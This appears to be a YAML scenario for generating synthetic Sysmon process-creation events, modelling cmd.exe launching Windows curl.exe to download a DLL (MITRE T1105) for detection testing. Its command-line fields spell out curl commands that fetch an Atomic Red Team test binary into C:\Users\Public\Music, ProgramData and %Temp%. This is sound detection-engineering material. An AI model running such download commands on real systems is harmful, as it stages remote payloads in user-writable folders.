type: scenario
description: |
  A command shell runs curl.exe to download a remote file into a
  user-writable directory. Sysmon EID 1 (Process Create) records cmd.exe
  starting the curl.exe that ships with Windows, with a URL and an output
  option, for example `-o` or `--output`, that names a destination such as
  `C:\Users\Public\Music`, `C:\ProgramData` or the user's
  `AppData\Local\Temp` folder. The event records the command, not whether
  the download completed.
tags: [eid1]
mitre:
  tactics: [command-and-control]
  techniques: [T1105]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:            gen.hostname(class=windows-server, domain=ref.domain_fqdn)
  sysmon_pid:          gen.int(min=1000, max=4000)
  sysmon_tid:          gen.int(min=1000, max=9999)
  event_record_id:     gen.int(min=5000, max=9999999)
  user_name:           Administrator
  user_short_name:     ADMINI~1
  user:                "${ref.domain_short}\\${ref.user_name}"
  current_directory:   "C:\\Users\\${ref.user_short_name}\\AppData\\Local\\Temp\\2\\"
  logon_guid_raw:      fn.upper(gen.uuid())
  logon_guid:          "{${ref.logon_guid_raw}}"
  logon_id_hex:        gen.hex(len=5, case=lower)
  logon_id:            "0x${ref.logon_id_hex}"
  process_guid_raw:    fn.upper(gen.uuid())
  process_guid:        "{${ref.process_guid_raw}}"
  process_id:          gen.int(min=1000, max=9999)
  parent_guid_raw:     fn.upper(gen.uuid())
  parent_process_guid: "{${ref.parent_guid_raw}}"
  parent_process_id:   gen.int(min=1000, max=9999)
  download_url:        "https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll"
  output_option:       "-o"
  output_path:         "c:\\users\\public\\music\\allthethingsx64.dll"
  command_line:        "C:\\Windows\\System32\\Curl.exe  -k ${ref.download_url} ${ref.output_option} ${ref.output_path} "
  parent_command_line: '"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k ${ref.download_url} -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k ${ref.download_url} --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k ${ref.download_url} -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k ${ref.download_url} -o %Temp%\allthethingsx64.dll" '

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": "C:\\Windows\\System32\\Curl.exe"
            - "@Name": FileVersion
              "#text": "7.79.1"
            - "@Name": Description
              "#text": "The curl executable"
            - "@Name": Product
              "#text": "The curl executable"
            - "@Name": Company
              "#text": "curl, https://curl.se/"
            - "@Name": OriginalFileName
              "#text": curl.exe
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": 2
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528"
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": "C:\\Windows\\System32\\cmd.exe"
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
